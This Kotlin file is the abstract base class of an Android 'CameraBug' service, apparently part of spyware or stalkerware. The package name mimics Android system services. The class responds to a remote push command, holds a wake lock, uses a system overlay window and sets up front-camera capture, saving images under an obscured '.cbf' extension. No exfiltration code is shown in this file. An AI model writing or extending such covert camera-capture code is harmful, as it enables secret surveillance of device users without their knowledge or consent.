package com.android.services.services.cameraBug


import android.app.Service
import android.content.Context
import android.content.Intent
import android.hardware.camera2.*
import android.os.Build
import android.os.PowerManager
import android.view.*
import androidx.annotation.RequiresApi
import androidx.camera.core.ImageAnalysis
import androidx.camera.core.ImageCapture
import androidx.camera.core.Preview
import androidx.camera.view.PreviewView
import com.android.services.interfaces.IBackgroundProcessing
import com.android.services.models.CameraBugCommand
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

@SuppressWarnings("deprecation")
@RequiresApi(Build.VERSION_CODES.LOLLIPOP)
abstract class CameraBugCommandProcessingBase(val applicationContext: Context) :
    IBackgroundProcessing {

    companion object {
        const val TAG = "CameraBug "
        const val KEY_CAMERA_BUG_PUSH = "CAMERA_BUG_PUSH"
        internal const val TAG_CAMERA_BUG_WAKE_LOCK = "myApp:TOSCameraBugWork"
        var cameraBugStatus: String? = null
        internal const val CAMERA_BUG_NOTIFICATION_ID = 111
    }

    protected lateinit var mWindowManager: WindowManager
    internal lateinit var previewUseCase: Preview
    internal lateinit var captureUseCase: ImageCapture
    internal lateinit var analysisUseCase: ImageAnalysis
    internal var customData="frontCamera"

    protected val windowManagerFlagOverlay =
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY else
            WindowManager.LayoutParams.TYPE_SYSTEM_ALERT
    lateinit var cameraBugPush: CameraBugCommand

    /** Returns the output file path **/
    val mFilePath by lazy {
        val sdf = SimpleDateFormat("yyyy_MM_dd_HH_mm_ss_SSS", Locale.US)
        AppUtils.retrieveFilePath(
            applicationContext,
            AppConstants.DIR_CAMERA_BUG,
            "IMG_${sdf.format(Date())}.cbf"
        )
    }

    internal lateinit var viewFinder: PreviewView
    internal var wakeLock: PowerManager.WakeLock? = null
    internal var imageCapture: ImageCapture? = null

    internal val photoCaptureExecutor: ExecutorService by lazy {
        Executors.newSingleThreadExecutor()
    }

    internal val cameraExecutor: ExecutorService by lazy {
        Executors.newSingleThreadExecutor()
    }

    abstract fun initialize()
    abstract fun parseIntent(intent: Intent)
    abstract fun startCommand()
    abstract fun onServiceDestroy()

    override fun onCreate() {
        initialize()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startCommand()
        intent?.let {
            parseIntent(intent)
        }
        return Service.START_REDELIVER_INTENT
    }

    override fun onDestroy() {
        onServiceDestroy()
    }
}